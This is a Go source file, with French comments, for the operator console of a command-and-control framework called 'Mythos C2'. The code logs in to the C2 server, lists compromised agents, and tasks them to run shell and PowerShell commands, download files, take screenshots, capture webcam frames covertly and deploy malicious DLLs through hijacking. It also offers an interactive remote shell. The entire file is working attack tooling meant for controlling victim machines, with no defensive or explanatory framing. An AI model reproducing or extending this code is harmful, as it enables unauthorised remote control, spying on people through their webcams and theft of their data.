// operator/console.go — Console interactive pour les opérateurs Mythos C2
//
// Interface en ligne de commande pour interagir avec le C2.
// Similaire à la console de Metasploit ou Sliver, mais plus léger.
//
// Commandes disponibles :
//   agents              → lister les agents actifs
//   use <id>            → sélectionner un agent
//   shell <cmd>         → exécuter une commande shell
//   powershell <script> → exécuter du PowerShell
//   upload <src> <dst>  → uploader un fichier
//   download <path>     → télécharger un fichier
//   inject <pid>        → injecter du shellcode dans un PID
//   proclist            → liste des processus
//   screenshot          → capture d'écran
//   webcam              → capturer un frame webcam (sauvegardé en JPEG local)
//   sleep <seconds>     → modifier l'intervalle beacon
//   kill                → terminer l'agent
//   interactive         → mode shell pseudo-interactif
//   back                → désélectionner l'agent
//   events              → voir les derniers événements
//   help                → afficher l'aide
//   exit                → quitter la console

package operator

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// Console — interface CLI pour l'opérateur
type Console struct {
	APIBase     string // URL de l'API (ex: http://127.0.0.1:8443)
	Token       string // JWT de l'opérateur
	ActiveAgent string // Agent sélectionné
	reader      *bufio.Reader
	client      *http.Client
}

// NewConsole — crée une nouvelle console
func NewConsole(apiBase string) *Console {
	return &Console{
		APIBase: apiBase,
		reader:  bufio.NewReader(os.Stdin),
		client:  &http.Client{Timeout: 30 * time.Second},
	}
}

// Run — boucle principale de la console
func (c *Console) Run() {
	c.printBanner()

	// Connexion
	if err := c.login(); err != nil {
		fmt.Printf("[!] Connexion échouée: %v\n", err)
		return
	}

	// Boucle de commandes
	for {
		prompt := c.buildPrompt()
		fmt.Print(prompt)

		line, err := c.reader.ReadString('\n')
		if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]
		args := parts[1:]

		if err := c.handleCommand(cmd, args); err != nil {
			if err.Error() == "exit" {
				break
			}
			fmt.Printf("[!] %v\n", err)
		}
	}

	fmt.Println("\n[*] Au revoir.")
}

// login — authentification auprès de l'API
func (c *Console) login() error {
	fmt.Print("Username: ")
	username, _ := c.reader.ReadString('\n')
	username = strings.TrimSpace(username)

	fmt.Print("Password: ")
	password, _ := c.reader.ReadString('\n')
	password = strings.TrimSpace(password)

	body, _ := json.Marshal(map[string]string{
		"username": username,
		"password": password,
	})

	resp, err := c.client.Post(
		c.APIBase+"/api/operators/login",
		"application/json",
		bytes.NewBuffer(body),
	)
	if err != nil {
		return fmt.Errorf("connexion au serveur: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("identifiants incorrects")
	}

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)

	token, ok := result["token"].(string)
	if !ok {
		return fmt.Errorf("token manquant dans la réponse")
	}

	c.Token = token
	fmt.Printf("\n[+] Connecté en tant que %s\n\n", username)
	return nil
}

// handleCommand — dispatch des commandes
func (c *Console) handleCommand(cmd string, args []string) error {
	switch cmd {
	case "agents", "ls":
		return c.cmdAgents()
	case "use":
		if len(args) == 0 {
			return fmt.Errorf("usage: use <agent_id>")
		}
		return c.cmdUse(args[0])
	case "interactive", "i":
		return c.cmdInteractive()
	case "back":
		c.ActiveAgent = ""
		return nil
	case "shell", "sh":
		if c.ActiveAgent == "" {
			return fmt.Errorf("aucun agent sélectionné — utiliser 'use <id>'")
		}
		if len(args) == 0 {
			return fmt.Errorf("usage: shell <commande>")
		}
		return c.cmdTask("shell", strings.Join(args, " "))
	case "powershell", "ps":
		if c.ActiveAgent == "" {
			return fmt.Errorf("aucun agent sélectionné")
		}
		return c.cmdTask("powershell", strings.Join(args, " "))
	case "proclist", "ps aux":
		if c.ActiveAgent == "" {
			return fmt.Errorf("aucun agent sélectionné")
		}
		return c.cmdTask("proclist", "")
	case "download":
		if c.ActiveAgent == "" || len(args) == 0 {
			return fmt.Errorf("usage: download <remote_path>")
		}
		return c.cmdTask("download", args[0])
	case "hijack_scan":
		if c.ActiveAgent == "" {
			return fmt.Errorf("aucun agent sélectionné")
		}
		return c.cmdTask("hijack_scan", "")
	case "hijack_deploy":
		if c.ActiveAgent == "" || len(args) == 0 {
			return fmt.Errorf("usage: hijack_deploy <chemin_local_vers_dll>")
		}
		return c.cmdHijackDeploy(args[0])
	case "webcam":
		if c.ActiveAgent == "" {
			return fmt.Errorf("aucun agent sélectionné")
		}
		return c.cmdWebcam()
	case "screenshot":
		if c.ActiveAgent == "" {
			return fmt.Errorf("aucun agent sélectionné")
		}
		return c.cmdTask("screenshot", "")

	case "sleep":
		if c.ActiveAgent == "" || len(args) == 0 {
			return fmt.Errorf("usage: sleep <secondes>")
		}
		return c.cmdTask("sleep", args[0])
	case "netstat":
		if c.ActiveAgent == "" {
			return fmt.Errorf("aucun agent sélectionné")
		}
		return c.cmdTask("netstat", "")
	case "kill":
		if c.ActiveAgent == "" {
			return fmt.Errorf("aucun agent sélectionné")
		}
		return c.cmdTask("kill", "")
	case "events":
		return c.cmdEvents()
	case "tasks":
		if c.ActiveAgent == "" {
			return fmt.Errorf("aucun agent sélectionné")
		}
		return c.cmdTasks()
	case "help", "?":
		c.printHelp()
		return nil
	case "exit", "quit":
		return fmt.Errorf("exit")
	default:
		fmt.Printf("[!] Commande inconnue: %s (tapez 'help')\n", cmd)
		return nil
	}
}

// cmdAgents — affiche la liste des agents
func (c *Console) cmdAgents() error {
	var result map[string]interface{}
	if err := c.apiGet("/api/agents", &result); err != nil {
		return err
	}

	agents, _ := result["agents"].([]interface{})
	if len(agents) == 0 {
		fmt.Println("[*] Aucun agent actif")
		return nil
	}

	// En-tête du tableau
	fmt.Printf("\n  %-10s  %-20s  %-20s  %-8s  %-8s  %-10s\n",
		"ID", "HOSTNAME", "USER", "OS", "ADMIN", "LAST SEEN")
	fmt.Println("  " + strings.Repeat("─", 78))

	for _, a := range agents {
		agent := a.(map[string]interface{})
		id := fmt.Sprintf("%v", agent["id"])
		if len(id) > 8 {
			id = id[:8]
		}

		lastSeen := ""
		if ls, ok := agent["last_seen"].(string); ok {
			if t, err := time.Parse(time.RFC3339, ls); err == nil {
				lastSeen = formatDuration(time.Since(t))
			}
		}

		status := ""
		if agent["status"] == "active" {
			status = "●"
		} else {
			status = "○"
		}

		fmt.Printf("  %s %-8s  %-20s  %-20s  %-8s  %-8v  %s ago\n",
			status,
			id,
			truncate(fmt.Sprintf("%v", agent["hostname"]), 20),
			truncate(fmt.Sprintf("%v", agent["username"]), 20),
			truncate(fmt.Sprintf("%v", agent["os"]), 8),
			agent["is_admin"],
			lastSeen,
		)
	}
	fmt.Println()
	return nil
}

// cmdUse — sélectionne un agent
func (c *Console) cmdUse(id string) error {
	var agent map[string]interface{}
	if err := c.apiGet("/api/agents/"+id, &agent); err != nil {
		// Essayer avec prefix match
		var result map[string]interface{}
		c.apiGet("/api/agents", &result)
		agents, _ := result["agents"].([]interface{})
		for _, a := range agents {
			ag := a.(map[string]interface{})
			agID := fmt.Sprintf("%v", ag["id"])
			if strings.HasPrefix(agID, id) {
				c.ActiveAgent = agID
				fmt.Printf("[+] Agent sélectionné: %s@%s (%s)\n",
					ag["username"], ag["hostname"], agID[:8])
				return nil
			}
		}
		return fmt.Errorf("agent non trouvé: %s", id)
	}

	c.ActiveAgent = fmt.Sprintf("%v", agent["id"])
	fmt.Printf("[+] Agent sélectionné: %s@%s\n",
		agent["username"], agent["hostname"])
	return nil
}

// cmdTaskInternal — envoie une tâche et retourne son ID complet
func (c *Console) cmdTaskInternal(taskType, payload string) (string, error) {
	body, _ := json.Marshal(map[string]string{
		"type":    taskType,
		"payload": payload,
	})

	resp, err := c.apiPost("/api/agents/"+c.ActiveAgent+"/task", body)
	if err != nil {
		return "", err
	}

	taskID, _ := resp["task_id"].(string)
	return taskID, nil
}

// cmdTask — envoie une tâche à l'agent actif et affiche le message classique
func (c *Console) cmdTask(taskType, payload string) error {
	taskID, err := c.cmdTaskInternal(taskType, payload)
	if err != nil {
		return err
	}

	if len(taskID) > 8 {
		taskID = taskID[:8]
	}

	fmt.Printf("[+] Tâche %s créée [%s] — en attente du beacon...\n",
		taskType, taskID)
	return nil
}

// cmdHijackDeploy — lit une DLL locale, l'encode en base64 et l'envoie à l'agent
func (c *Console) cmdHijackDeploy(dllPath string) error {
	data, err := os.ReadFile(dllPath)
	if err != nil {
		return fmt.Errorf("impossible de lire la DLL locale: %v", err)
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	
	fmt.Printf("[*] Envoi de la DLL (%d bytes)...", len(data))
	return c.cmdTask("hijack_deploy", encoded)
}

// cmdWebcam — demande une capture webcam à l'agent et sauvegarde le JPEG localement
//
// Flux :
//   1. Envoie la tâche "webcam_snap" à l'agent
//   2. Poll le résultat (timeout 60s — la capture peut prendre du temps)
//   3. Si succès : décode le base64 JPEG et sauvegarde en fichier local
//   4. Si échec : affiche les défenses Windows détectées par l'agent
func (c *Console) cmdWebcam() error {
	fmt.Println("[*] Envoi de la tâche webcam_snap à l'agent...")
	fmt.Println("[!] Note : la LED de la webcam s'allumera sur la machine cible")

	taskID, err := c.cmdTaskInternal("webcam_snap", "")
	if err != nil {
		return err
	}

	shortID := taskID
	if len(shortID) > 8 {
		shortID = shortID[:8]
	}
	fmt.Printf("[+] Tâche webcam_snap créée [%s] — attente résultat (timeout 60s)...\n", shortID)

	// Poll avec timeout étendu (60s) car la capture webcam prend du temps
	result := c.pollWebcamResult(taskID)
	if result == "" {
		return fmt.Errorf("timeout : l'agent n'a pas retourné de résultat dans les 60 secondes")
	}

	// Parser le résultat
	if strings.HasPrefix(result, "WEBCAM_SUCCESS") {
		lines := strings.SplitN(result, "\n", -1)
		var imageB64 string
		var deviceName, resolution, defenses string

		for _, line := range lines {
			if strings.HasPrefix(line, "Device: ") {
				deviceName = strings.TrimPrefix(line, "Device: ")
			} else if strings.HasPrefix(line, "Resolution: ") {
				resolution = strings.TrimPrefix(line, "Resolution: ")
			} else if strings.HasPrefix(line, "Defenses: ") {
				defenses = strings.TrimPrefix(line, "Defenses: ")
			} else if strings.HasPrefix(line, "DATA:") {
				imageB64 = strings.TrimPrefix(line, "DATA:")
			}
		}

		fmt.Printf("[+] Webcam capturée avec succès !\n")
		fmt.Printf("    Périphérique : %s\n", deviceName)
		fmt.Printf("    Résolution   : %s\n", resolution)
		fmt.Printf("    Défenses     : %s\n", defenses)

		// Décoder et sauvegarder le JPEG
		if imageB64 != "" {
			jpegData, err := base64.StdEncoding.DecodeString(imageB64)
			if err != nil {
				return fmt.Errorf("erreur décodage base64 JPEG : %v", err)
			}

			// Nom de fichier avec timestamp
			timestamp := time.Now().Format("20060102_150405")
			agentShort := c.ActiveAgent
			if len(agentShort) > 8 {
				agentShort = agentShort[:8]
			}
			filename := filepath.Join(".", fmt.Sprintf("webcam_%s_%s.jpg", agentShort, timestamp))

			if err := os.WriteFile(filename, jpegData, 0644); err != nil {
				return fmt.Errorf("impossible de sauvegarder le JPEG : %v", err)
			}

			absPath, _ := filepath.Abs(filename)
			fmt.Printf("[+] Image sauvegardée → %s (%d bytes)\n", absPath, len(jpegData))
		}
	} else if strings.HasPrefix(result, "WEBCAM_FAILED") {
		fmt.Println("[!] Capture webcam échouée — Rapport de défenses Windows :")
		lines := strings.Split(result, "\n")
		for _, line := range lines[1:] {
			if strings.TrimSpace(line) != "" {
				fmt.Printf("    %s\n", line)
			}
		}
	} else {
		fmt.Printf("[?] Réponse inattendue : %s\n", result)
	}

	return nil
}

// pollWebcamResult — poll spécialisé avec timeout 60s pour la capture webcam
func (c *Console) pollWebcamResult(taskID string) string {
	for i := 0; i < 60; i++ {
		time.Sleep(1 * time.Second)
		var result map[string]interface{}
		if err := c.apiGet("/api/agents/"+c.ActiveAgent+"/tasks", &result); err != nil {
			continue
		}
		tasks, ok := result["tasks"].([]interface{})
		if !ok {
			continue
		}
		for _, t := range tasks {
			task := t.(map[string]interface{})
			id := fmt.Sprintf("%v", task["id"])
			if id == taskID {
				status := fmt.Sprintf("%v", task["status"])
				if status == "success" || status == "done" {
					return fmt.Sprintf("%v", task["result"])
				} else if status == "error" {
					return fmt.Sprintf("%v", task["result"])
				}
			}
		}
	}
	return ""
}

// cmdInteractive — mode shell pseudo-interactif
func (c *Console) cmdInteractive() error {
	if c.ActiveAgent == "" {
		return fmt.Errorf("aucun agent sélectionné")
	}

	fmt.Println("[*] Passage en mode interactif (sleep = 1s)...")
	c.cmdTaskInternal("sleep", "1")

	for {
		shortID := c.ActiveAgent
		if len(shortID) > 8 {
			shortID = shortID[:8]
		}
		fmt.Printf("mythos-shell [%s] > ", shortID)

		line, err := c.reader.ReadString('\n')
		if err == io.EOF {
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if line == "exit" || line == "quit" {
			break
		}

		parts := strings.Fields(line)
		cmd := parts[0]

		taskType := "shell"
		payload := line

		if cmd == "cd" {
			taskType = "cd"
			if len(parts) > 1 {
				payload = strings.Join(parts[1:], " ")
			} else {
				payload = ""
			}
		} else if cmd == "pwd" {
			taskType = "pwd"
			payload = ""
		}

		// Send task
		taskID, err := c.cmdTaskInternal(taskType, payload)
		if err != nil {
			fmt.Printf("[!] Erreur: %v\n", err)
			continue
		}

		// Poll for result
		c.pollTaskResult(taskID)
	}

	fmt.Println("[*] Sortie du mode interactif (rétablissement sleep = 60s)...")
	c.cmdTaskInternal("sleep", "60")
	return nil
}

// pollTaskResult — attend le résultat d'une tâche
func (c *Console) pollTaskResult(taskID string) {
	for i := 0; i < 30; i++ { // Timeout 30s
		time.Sleep(1 * time.Second)
		var result map[string]interface{}
		if err := c.apiGet("/api/agents/"+c.ActiveAgent+"/tasks", &result); err != nil {
			continue
		}
		tasks, ok := result["tasks"].([]interface{})
		if !ok {
			continue
		}
		for _, t := range tasks {
			task := t.(map[string]interface{})
			id := fmt.Sprintf("%v", task["id"])
			if id == taskID {
				status := fmt.Sprintf("%v", task["status"])
				if status == "success" || status == "done" {
					fmt.Printf("%v\n", task["result"])
					return
				} else if status == "error" {
					fmt.Printf("[!] Erreur :\n%v\n", task["result"])
					return
				}
			}
		}
	}
	fmt.Println("[!] Timeout: l'agent n'a pas répondu à temps.")
}

// cmdTasks — affiche l'historique des tâches
func (c *Console) cmdTasks() error {
	var result map[string]interface{}
	if err := c.apiGet("/api/agents/"+c.ActiveAgent+"/tasks", &result); err != nil {
		return err
	}

	tasks, _ := result["tasks"].([]interface{})
	if len(tasks) == 0 {
		fmt.Println("[*] Aucune tâche")
		return nil
	}

	fmt.Printf("\n  %-10s  %-15s  %-10s  %s\n", "ID", "TYPE", "STATUS", "RESULT")
	fmt.Println("  " + strings.Repeat("─", 70))

	for _, t := range tasks {
		task := t.(map[string]interface{})
		id := fmt.Sprintf("%v", task["id"])
		if len(id) > 8 {
			id = id[:8]
		}
		result := truncate(fmt.Sprintf("%v", task["result"]), 40)
		fmt.Printf("  %-10s  %-15s  %-10s  %s\n",
			id,
			task["type"],
			task["status"],
			result,
		)
	}
	fmt.Println()
	return nil
}

// cmdEvents — affiche les événements récents
func (c *Console) cmdEvents() error {
	var result map[string]interface{}
	if err := c.apiGet("/api/events", &result); err != nil {
		return err
	}

	events, _ := result["events"].([]interface{})
	if len(events) == 0 {
		fmt.Println("[*] Aucun événement")
		return nil
	}

	fmt.Println()
	for _, e := range events {
		ev := e.(map[string]interface{})
		ts := ""
		if t, ok := ev["timestamp"].(string); ok {
			if parsed, err := time.Parse(time.RFC3339, t); err == nil {
				ts = parsed.Format("15:04:05")
			}
		}
		fmt.Printf("  [%s] %s — %s\n", ts, ev["type"], ev["message"])
	}
	fmt.Println()
	return nil
}

// ─────────────────────────────────────────────────────────────
// API helpers
// ─────────────────────────────────────────────────────────────

func (c *Console) apiGet(path string, result interface{}) error {
	req, _ := http.NewRequest("GET", c.APIBase+path, nil)
	req.Header.Set("Authorization", "Bearer "+c.Token)

	resp, err := c.client.Do(req)
	if err != nil {
		return fmt.Errorf("API error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		var errResp map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&errResp)
		if e, ok := errResp["error"].(string); ok {
			return fmt.Errorf("HTTP %d: %s", resp.StatusCode, e)
		}
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	return json.NewDecoder(resp.Body).Decode(result)
}

func (c *Console) apiPost(path string, body []byte) (map[string]interface{}, error) {
	req, _ := http.NewRequest("POST", c.APIBase+path, bytes.NewBuffer(body))
	req.Header.Set("Authorization", "Bearer "+c.Token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := c.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("API error: %w", err)
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)

	if resp.StatusCode >= 400 {
		if e, ok := result["error"].(string); ok {
			return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, e)
		}
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	return result, nil
}

// ─────────────────────────────────────────────────────────────
// UI helpers
// ─────────────────────────────────────────────────────────────

func (c *Console) buildPrompt() string {
	if c.ActiveAgent != "" {
		short := c.ActiveAgent
		if len(short) > 8 {
			short = short[:8]
		}
		return fmt.Sprintf("mythos [%s] > ", short)
	}
	return "mythos > "
}

func (c *Console) printBanner() {
	fmt.Println(`
╔╦╗╦ ╦╔╦╗╦ ╦╔═╗╔═╗  ╔═╗╔═╗
║║║╚╦╝ ║ ╠═╣║ ║╚═╗  ║  ╔═╝
╩ ╩ ╩  ╩ ╩ ╩╚═╝╚═╝  ╚═╝╚═╝  v1.0.0
SHERKO — Operator Console
`)
}

func (c *Console) printHelp() {
	help := `
  Commandes générales :
    agents / ls         Lister tous les agents actifs
    use <id>            Sélectionner un agent (prefix OK)
    back                Désélectionner l'agent courant
    events              Voir les derniers événements
    help / ?            Cette aide
    exit / quit         Quitter

  Commandes agent (nécessite 'use <id>') :
    shell <cmd>         Exécuter une commande shell
    powershell <script> Exécuter du PowerShell
    proclist            Lister les processus
    netstat             Connexions réseau actives
    download <path>     Télécharger un fichier
    screenshot          Capture d'écran
    webcam              Capturer un frame webcam → JPEG sauvegardé localement
    sleep <secs>        Modifier l'intervalle beacon
    tasks               Historique des tâches
    interactive         Mode shell pseudo-interactif (sleep 1s)
    kill                Terminer l'agent
    hijack_scan         Rechercher des cibles de DLL hijacking
    hijack_deploy <dll> Déployer une DLL malveillante

  Tips :
    - Les IDs peuvent être abrégés (8 premiers caractères)
    - Les tâches sont asynchrones — l'agent les récupère au prochain beacon
    - Utiliser 'tasks' pour voir les résultats
    - 'webcam' sauvegarde automatiquement le JPEG dans le répertoire courant
`
	fmt.Println(help)

}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n-3] + "..."
}

func formatDuration(d time.Duration) string {
	if d < time.Minute {
		return fmt.Sprintf("%ds", int(d.Seconds()))
	}
	if d < time.Hour {
		return fmt.Sprintf("%dm", int(d.Minutes()))
	}
	return fmt.Sprintf("%dh", int(d.Hours()))
}
